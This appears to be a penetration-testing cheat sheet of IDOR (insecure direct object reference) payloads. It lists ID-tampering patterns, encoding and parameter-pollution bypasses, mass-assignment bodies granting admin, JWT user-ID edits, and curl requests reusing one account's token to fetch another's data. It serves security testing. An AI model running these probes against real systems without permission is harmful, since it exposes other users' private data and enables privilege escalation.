# IDOR Payloads Library

## Basic IDOR Patterns

### Numeric ID manipulation
```
# Increment/Decrement
GET /api/user/123 → GET /api/user/124
GET /api/invoice/1000 → GET /api/invoice/1001

# Hexadecimal
GET /api/user/0x1F4 → GET /api/user/0x1F5

# Timestamp/Epoch
GET /api/resource/1695574808 → GET /api/resource/1695575098
```

### GUID/UUID patterns
```
# UUID v1 (time-based, predictable)
95f6e264-bb00-11ec-8833-00155d01ef00

# MongoDB ObjectId (timestamp + machine + proc + counter)
5ae9b90a2c144b9def01ec37

# Sequential prediction
user_001, user_002, user_003
```

## Parameter Manipulation

### URL Parameters
```
/profile?user_id=123
/profile?user_id=124
/profile?id=123
/profile?id=124
```

### POST Data
```json
{"id": 123}
{"id": 124}
{"user_id": 123}
{"user_id": 124}
```

### Path Parameters
```
/api/users/123
/api/users/124
/api/v1/invoices/123
/api/v1/invoices/124
```

## Hash Manipulation

### Common hashes to test
```
# MD5
098f6bcd4621d373cade4e832627b4f6 = test

# SHA1
a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 = test

# SHA2/256
9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 = test
```

### Try decoding
```
am9obi5kb2VAbWFpbC5jb20= → base64 of john.doe@mail.com
```

## Wildcard Testing

```
GET /api/users/*
GET /api/users/%
GET /api/users/_
GET /api/users/.
```

## HTTP Method Manipulation

```
# Change method
GET → POST
POST → PUT
PUT → DELETE

# Content-Type switch
application/json → application/xml
application/x-www-form-urlencoded → multipart/form-data
```

## Parameter Pollution

```
user_id=attacker_id&user_id=victim_id
user_id[]=123&user_id[]=124
id=123&id=124
```

## Status Code Analysis

| Status | Meaning |
|--------|---------|
| 200 | Resource accessible (potential IDOR) |
| 401/403 | Properly protected |
| 404 | Resource doesn't exist |
| 500 | Error in request |

## JSON Arrays

```json
{"id": 19}
{"id": [19]}
{"id": {"value": 19}}
```

## Bypass Techniques

### Change format
```
JSON: {"id": 123}
Array: id[]=123
XML: <id>123</id>
```

### Encode parameters
```
Base64: id=MTIz
Hex: id=0x7b
URL: id=123%27
```

### Extra characters
```
/api/users/123.
/api/users/123#
/api/users/123%20
/api/users/123%00
```

## Authentication Context Testing

### With auth token
```bash
# User A accessing own resource
curl -H "Authorization: Bearer TOKEN_A" https://target.com/api/data/123

# User A accessing User B's resource
curl -H "Authorization: Bearer TOKEN_A" https://target.com/api/data/124

# Compare responses - if same data structure, likely IDOR
```

### Without auth
```bash
# Unauthenticated access attempt
curl https://target.com/api/data/123
curl https://target.com/api/data/124
```

## GraphQL IDOR

```graphql
# Try different user IDs
query { user(id: "123") { name email } }
query { user(id: "124") { name email } }

# List all users
query { users { id name email } }
```

## Mass Assignment Patterns

```json
{"user_id": 123, "role": "admin"}
{"user_id": 123, "is_admin": true}
{"id": 123, "email": "attacker@evil.com"}
```

## JWT IDOR (if token contains user ID)

```bash
# Decode token, modify user_id, re-sign
# Original: {"sub": "123", "role": "user"}
# Modified: {"sub": "124", "role": "user"}
```

## Common Endpoints to Test

```
/api/users/{id}
/api/profile/{id}
/api/invoices/{id}
/api/orders/{id}
/api/documents/{id}
/api/settings/{id}
/api/files/{id}
/api/messages/{id}
/api/comments/{id}
/api/attachments/{id}
/api/reports/{id}
/api/payments/{id}
/api/subscriptions/{id}
```

## Sibling Endpoint Enumeration

If `/api/users/123/orders` works, try:
```
/api/users/123/export
/api/users/123/delete
/api/users/123/share
/api/users/123/permissions
/api/users/123/profile
/api/users/123/password
/api/users/123/settings
```

## Quick Checklist

- [ ] Change ID from yours to sequential other
- [ ] Try negative numbers
- [ ] Try 0, 1, -1
- [ ] Try UUID/GUID
- [ ] Try decoded/encoded values
- [ ] Try wildcards (*, %, _)
- [ ] Change HTTP method
- [ ] Remove authentication entirely
- [ ] Test with two different accounts
- [ ] Check all sibling endpoints